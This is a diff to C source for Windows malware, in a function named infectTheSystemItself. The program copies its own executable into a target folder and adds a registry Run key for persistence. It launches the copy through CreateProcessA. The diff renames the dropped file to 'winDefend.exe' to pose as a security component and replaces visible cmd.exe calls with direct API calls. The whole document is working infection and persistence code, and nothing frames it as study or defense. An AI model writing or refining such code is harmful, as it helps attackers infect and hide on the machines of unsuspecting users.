@@ -8,11 +8,12 @@ void infectTheSystemItself(void)
 {
 	HKEY hKey;
 	DWORD dwAttr;
-	char command[400 + 1];
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
 	char targetPath[MAX_PATH + 1];
 	char srcPathwithName[MAX_PATH + 1];
 	char targetPathwithName[MAX_PATH + 1];
-	const char progName[] = "deneme.exe";
+	const char progName[] = "winDefend.exe";
 
 	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);
 
@@ -30,12 +31,8 @@ void infectTheSystemItself(void)
 	}
 
 	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);
-
-	snprintf(command, 400, "cmd.exe /c mkdir \"%s\"", targetPath);
-	WinExec(command, SW_HIDE); Sleep(500);
-
-	snprintf(command, 400, "cmd.exe /c copy \"%s\" \"%s\"", srcPathwithName, targetPathwithName);
-	WinExec(command, SW_HIDE); Sleep(500);
+	CreateDirectoryA(targetPath, NULL);
+	CopyFile(srcPathwithName, targetPathwithName, 0);
 
 	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey))
 	{
@@ -53,8 +50,27 @@ void infectTheSystemItself(void)
 
 	RegCloseKey(hKey);
 
-	snprintf(command, 400, "cmd.exe /c start %s", targetPathwithName);
-	WinExec(command, SW_HIDE); Sleep(500);
+
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+	si.cb = sizeof(si);
+
+	CreateProcessA
+	(
+		targetPathwithName,     // the path
+		NULL,                   // Command line
+		NULL,                   // Process handle not inheritable
+		NULL,                   // Thread handle not inheritable
+		FALSE,                  // Set handle inheritance to FALSE
+		CREATE_NEW_CONSOLE,     // Opens file in a separate console
+		NULL,           		// Use parent's environment block
+		NULL,           		// Use parent's starting directory
+		&si,            		// Pointer to STARTUPINFO structure
+		&pi           			// Pointer to PROCESS_INFORMATION structure
+	);
+
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 
 	exit(0);
 }
